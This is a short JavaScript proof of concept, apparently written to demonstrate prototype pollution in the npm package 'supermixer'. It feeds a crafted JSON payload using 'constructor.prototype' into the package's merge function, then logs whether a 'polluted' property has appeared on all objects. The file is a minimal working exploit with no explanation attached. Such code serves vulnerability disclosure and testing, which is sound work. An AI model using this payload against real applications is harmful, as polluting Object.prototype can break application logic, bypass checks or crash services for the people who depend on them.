var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var mixer = require('supermixer');
obj = {};
console.log({}.polluted);
var payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
mixer.merge(obj, JSON.parse(payload));
console.log({}.polluted);